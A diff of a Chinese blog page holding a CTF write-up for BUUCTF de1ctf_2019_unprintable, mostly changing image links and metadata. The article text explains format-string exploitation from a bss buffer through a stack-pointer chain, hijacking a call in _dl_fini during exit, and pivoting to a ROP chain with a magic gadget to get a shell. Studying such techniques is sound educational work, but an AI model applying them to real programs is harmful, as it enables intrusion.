@@ -20,61 +20,61 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="总结： 通过这道题的学习与收获有： 1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。这里稍稍总结两句。利用格式化字符漏洞来达到写的目的，分为两种情况。如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的">
+    <meta name="description" content="通过这道题的学习与收获有： 1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。这里稍稍总结两句。利用格式化字符漏洞来达到写的目的，分为两种情况。如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的目的。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF_de1ctf_2019_unprintable">
 <meta property="og:url" content="https://zikh26.github.io/posts/d34ee684.html">
 <meta property="og:site_name" content="ZIKH26&#39;s Blog">
-<meta property="og:description" content="总结： 通过这道题的学习与收获有： 1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。这里稍稍总结两句。利用格式化字符漏洞来达到写的目的，分为两种情况。如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的">
+<meta property="og:description" content="通过这道题的学习与收获有： 1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。这里稍稍总结两句。利用格式化字符漏洞来达到写的目的，分为两种情况。如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的目的。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222501934-1369976080.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222530244-1699956812.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222544382-1860213709.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222604821-2028299225.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222623038-343280554.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222641908-41446843.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222652607-1470036751.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222710108-373516738.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221014598-2091139831.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221013949-678030322.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222836279-1337151327.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222849072-1784896764.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222914265-1836923816.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222930128-970393783.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221012046-905721054.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419222956380-1871716338.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419223019980-1819334104.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419223038254-1190819708.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221011687-970875891.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221009667-1000319065.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221008260-139544778.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221006281-955412098.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221004925-759941982.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221003228-2090621249.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419221001000-1387788773.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220959694-85625257.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220958563-1794782074.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220957599-2028534812.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220956611-987086324.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220955982-2010102532.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220955263-29560299.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220952979-1955251566.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220954443-867091423.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220954240-1943973195.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220954014-45506295.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220953665-1979006857.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220952979-1955251566.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419220952622-1140853152.png">
-<meta property="og:image" content="https://zikh26.github.io/img/2706180-20220419223111162-935171477.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018008.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018009.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018010.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018011.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018012.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018013.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018014.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018015.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018016.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012021587.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018017.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018018.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018019.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018020.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018021.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018022.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018023.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018024.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018025.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018026.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018027.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018028.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018030.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018031.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018032.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018033.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018034.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018035.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018036.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018037.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018038.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018039.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018040.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018041.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018042.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018043.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018039.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018044.png">
+<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018045.png">
 <meta property="article:published_time" content="2023-05-14T23:36:47.457Z">
-<meta property="article:modified_time" content="2022-10-08T02:24:48.380Z">
+<meta property="article:modified_time" content="2023-07-01T12:21:14.868Z">
 <meta property="article:author" content="ZIKH26">
 <meta property="article:tag" content="one_gadget">
 <meta property="article:tag" content="magic_gadget">
 <meta property="article:tag" content="格式化字符串漏洞">
 <meta property="article:tag" content="劫持exit_hook">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zikh26.github.io/img/2706180-20220419222501934-1369976080.png">
+<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018008.png">
 
 
 <link rel="canonical" href="https://zikh26.github.io/posts/d34ee684.html">
@@ -156,7 +156,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">程序分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B%E8%B0%83%E8%AF%95"><span class="nav-number">4.</span> <span class="nav-text">尝试一下调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%88patch%E4%B8%80%E4%B8%8B"><span class="nav-number">4.1.</span> <span class="nav-text">先patch一下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E8%B0%83%E8%AF%95"><span class="nav-number">4.2.</span> <span class="nav-text">初步调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3exit%E7%9A%84%E9%80%80%E5%87%BA%E9%97%AE%E9%A2%98"><span class="nav-number">4.3.</span> <span class="nav-text">解决exit的退出问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B%E5%BD%93%E5%89%8D%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="nav-number">4.3.1.</span> <span class="nav-text">重新梳理一下当前信息：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E4%BB%AC%E5%BD%93%E4%B8%8B%E7%9A%84%E7%9B%AE%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">4.3.2.</span> <span class="nav-text">我们当下的目的是什么？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="nav-number">4.3.3.</span> <span class="nav-text">怎么做？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E5%BA%94payload"><span class="nav-number">4.3.4.</span> <span class="nav-text">对应payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%A4%9A%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%86%99%EF%BC%9F"><span class="nav-number">4.4.</span> <span class="nav-text">如何多次任意写？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%8A%E6%88%90%E5%93%81payload"><span class="nav-number">4.4.1.</span> <span class="nav-text">半成品payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%95%B4%E4%BD%93%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">题目整体大致思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E9%93%BE%E7%9A%84%E5%B8%83%E7%BD%AE"><span class="nav-number">6.</span> <span class="nav-text">栈链的布置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bmagic-gadget"><span class="nav-number">6.1.</span> <span class="nav-text">介绍一下magic_gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84magic-gadget"><span class="nav-number">6.1.1.</span> <span class="nav-text">一个新的magic_gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E8%BF%99%E4%B8%AA%E6%96%B0%E7%9A%84magic-gadget"><span class="nav-number">6.1.2.</span> <span class="nav-text">如何寻找这个新的magic gadget</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0"><span class="nav-number">7.</span> <span class="nav-text">rop链的构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP%EF%BC%9A"><span class="nav-number">8.</span> <span class="nav-text">EXP：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%80%9A%E4%BA%86%EF%BC%8C%E8%BF%9C%E7%A8%8B%E6%B2%A1%E9%80%9A%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%8E%BB%E8%80%83%E8%99%91libc%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">8.1.</span> <span class="nav-text">本地通了，远程没通，应该去考虑libc的问题</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">程序分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B%E8%B0%83%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">尝试一下调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%88patch%E4%B8%80%E4%B8%8B"><span class="nav-number">3.1.</span> <span class="nav-text">先patch一下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E8%B0%83%E8%AF%95"><span class="nav-number">3.2.</span> <span class="nav-text">初步调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3exit%E7%9A%84%E9%80%80%E5%87%BA%E9%97%AE%E9%A2%98"><span class="nav-number">3.3.</span> <span class="nav-text">解决exit的退出问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E6%A2%B3%E7%90%86%E4%B8%80%E4%B8%8B%E5%BD%93%E5%89%8D%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="nav-number">3.3.1.</span> <span class="nav-text">重新梳理一下当前信息：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E4%BB%AC%E5%BD%93%E4%B8%8B%E7%9A%84%E7%9B%AE%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">3.3.2.</span> <span class="nav-text">我们当下的目的是什么？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E5%81%9A%EF%BC%9F"><span class="nav-number">3.3.3.</span> <span class="nav-text">怎么做？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E5%BA%94payload"><span class="nav-number">3.3.4.</span> <span class="nav-text">对应payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%A4%9A%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%86%99%EF%BC%9F"><span class="nav-number">3.4.</span> <span class="nav-text">如何多次任意写？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%8A%E6%88%90%E5%93%81payload"><span class="nav-number">3.4.1.</span> <span class="nav-text">半成品payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%95%B4%E4%BD%93%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">题目整体大致思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E9%93%BE%E7%9A%84%E5%B8%83%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">栈链的布置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bmagic-gadget"><span class="nav-number">5.1.</span> <span class="nav-text">介绍一下magic_gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84magic-gadget"><span class="nav-number">5.1.1.</span> <span class="nav-text">一个新的magic_gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E8%BF%99%E4%B8%AA%E6%96%B0%E7%9A%84magic-gadget"><span class="nav-number">5.1.2.</span> <span class="nav-text">如何寻找这个新的magic gadget</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0"><span class="nav-number">6.</span> <span class="nav-text">rop链的构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">EXP：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%80%9A%E4%BA%86%EF%BC%8C%E8%BF%9C%E7%A8%8B%E6%B2%A1%E9%80%9A%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%8E%BB%E8%80%83%E8%99%91libc%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.1.</span> <span class="nav-text">本地通了，远程没通，应该去考虑libc的问题</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -171,7 +171,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">96</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -182,7 +182,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">100</span>
+        <span class="site-state-item-count">99</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -245,7 +245,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 20:21:14" itemprop="dateModified" datetime="2023-07-01T20:21:14+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -266,18 +266,20 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote>
+    <div class="post-body" itemprop="articleBody"><blockquote>
 <p>通过这道题的学习与收获有：</p>
 <p>1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。<br>这里稍稍总结两句。<br>利用格式化字符漏洞来达到写的目的，分为两种情况。<br>如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的目的。<br>如果输入是在bss段，那么要利用栈链，来进行任意地址任意写。</p>
-</blockquote>
-<blockquote>
 <p>2、这道题的思路是一边利用格式化字符串漏洞去不断执行printf和read，一边在栈里写入bss段地址，为之后的栈迁移做打算。最后将布置好的rop链发送过去，让执行流迁移到rop链上，利用magic gadget来获取shell。</p>
 <p>3、又收集到了一个新的magic gadget。adc    DWORD PTR [rbp+0x48],edx    机器码搜11554889</p>
 <p>4、第一次遇见格式化字符函数自己修改自己的返回地址去执行自己… 另外就是格式化字符并不需要对齐，格式化字符后面的地址才需要对齐。</p>
 <p>5、多注意栈里的数据，是否有特殊的存在。没思路的时候，就调试一下看看能不能找到有用的信息。</p>
 </blockquote>
-<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220419222501934-1369976080.png"></p>
-<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/../img/2706180-20220419222530244-1699956812.png"></p>
+<span id="more"></span>
+
+
+
+<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018008.png"></p>
+<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018009.png"></p>
 <p>程序很短，这题很简单？</p>
 <p>hh，继续往下看吧。</p>
 <p>程序就四个点，第一是程序自己泄露个栈地址</p>
@@ -286,39 +288,39 @@
 <p>第四是程序没有return，格式化字符函数利用完之后，程序就exit了。</p>
 <p>首先猜测泄露的栈地址应该是要配合格式化字符函数使用的，close只关闭了一个文件描述符，只要能获取shell的话，这个点也好处理。最困难的点是print后面紧接着就是exit了，因此去用print来修改main函数的返回地址以劫持执行流肯定是行不通的了，至此卡死…</p>
 <h2 id="尝试一下调试"><a href="#尝试一下调试" class="headerlink" title="尝试一下调试"></a>尝试一下调试</h2><h3 id="先patch一下"><a href="#先patch一下" class="headerlink" title="先patch一下"></a>先patch一下</h3><p>先patch一下libc和ld，这道题是2.23的libc，查看方法如下。</p>
-<p><img src="/../img/2706180-20220419222544382-1860213709.png"></p>
-<p><img src="/../img/2706180-20220419222604821-2028299225.png"></p>
-<p><img src="/../img/2706180-20220419222623038-343280554.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018010.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018011.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018012.png"></p>
 <p>然后下载对应的libc，patch一下即可。（这道题我看了一下发现是2.23的，就直接用glibc-all-in-one里的2.23libc了，结果最后导致小版本不同，本地打通了，远程没通，因此下回直接patch buu上给的libc即可）</p>
 <p><a href="(https://www.cnblogs.com/ZIKH26/articles/16044588.html)">如何patch，我这篇博客有提到</a></p>
 <h3 id="初步调试"><a href="#初步调试" class="headerlink" title="初步调试"></a>初步调试</h3><p>首先明确一下我们想看什么，我们现在什么也不知道，但是打算去看一下栈里的情况碰碰运气<strong>（栈中情况如下）</strong>。不过格式化字符函数之前的栈一律不用看（因为我们利用不了）。</p>
 <p>基本上感觉看不出来什么，如果非要说个不一样的，那就发现有个栈里的内容颜色和其他的不一样。（此时是即将执行格式化字符函数时）</p>
-<p><img src="/../img/2706180-20220419222641908-41446843.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018013.png"></p>
 <p>用vmmap看一下，发现这个地址是位于ld.so中的，这个地址有点奇怪，不过依然不知道这里有什么用。</p>
-<p><img src="/../img/2706180-20220419222652607-1470036751.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018014.png"></p>
 <p>不过根据经验来看，似乎是要劫持exit里的某个hook？因为之前也遇见过一道类似这种手法的题目。</p>
 <p>si进入exit里面看看。</p>
 <p>经过漫长的si之后，终于在dl_fini+250处执行之后，此时的栈里，居然出现了刚才的那个奇怪地址<strong>（栈中情况如下）</strong></p>
-<p><img src="/../img/2706180-20220419222710108-373516738.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018015.png"></p>
 <p>继续又si了很久，发现此时call了一下，我们溯源一下r12寄存器的值（rdx就不用管了，因为本身自己就为0了）。</p>
-<p><img src="/../img/2706180-20220419221014598-2091139831.png" alt="image-20220419094811717"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018016.png" alt="image-20220419094811717"></p>
 <p>往上翻了几步发现，r12的值是自身的值加上了rbx所指向的内容。(我们可以控制rbx所指向的内容，但是控制不了原本的r12)</p>
-<p><img src="/../img/2706180-20220419221013949-678030322.png" alt="image-20220419095011665"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012021587.png" alt="image-20230701202109352"></p>
 <h3 id="解决exit的退出问题"><a href="#解决exit的退出问题" class="headerlink" title="解决exit的退出问题"></a>解决exit的退出问题</h3><h4 id="重新梳理一下当前信息："><a href="#重新梳理一下当前信息：" class="headerlink" title="重新梳理一下当前信息："></a>重新梳理一下当前信息：</h4><p>1、栈里有个位于ld.so中的地址，我们可以利用格式化字符串漏洞修改这个地址所指向的值（但是修改不了这个位于ld.so地址）。<strong>（因为格式化字符串漏洞想要修改某个值，就必须去找到指向这个值的地址利用相对栈顶偏移完成修改）</strong>。</p>
 <p>2、程序最后调用了<code>exit</code>中的<code>__run_exit_handlers</code>函数中的<code>_dl_fini</code>中的一个call ptr[r12+rdx*8]   而r12就是那个**位于ld.so中的地址所指向的值(不修改的话，默认为0)**加了0x600dd8。</p>
 <h4 id="我们当下的目的是什么？"><a href="#我们当下的目的是什么？" class="headerlink" title="我们当下的目的是什么？"></a>我们当下的目的是什么？</h4><p>劫持程序执行流，不让其触发exit导致程序结束，并且让执行流去重新执行read以及printf（不能返回到main函数，不然会重新初始化栈空间），因为程序的漏洞点只有这一个，因此只能劫持到这里。</p>
-<h4 id="怎么做？"><a href="#怎么做？" class="headerlink" title="怎么做？"></a>怎么做？</h4><p>由于call后面加了个ptr，因此r12最后的值应该让它去指向这里<br><img src="/../img/2706180-20220419222836279-1337151327.png"></p>
+<h4 id="怎么做？"><a href="#怎么做？" class="headerlink" title="怎么做？"></a>怎么做？</h4><p>由于call后面加了个ptr，因此r12最后的值应该让它去指向这里<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018017.png"></p>
 <p>采用策略是将0x4007A3布置到bss段，然后让r12的值为指向0x4007A3的地址(也就是bss段地址)。</p>
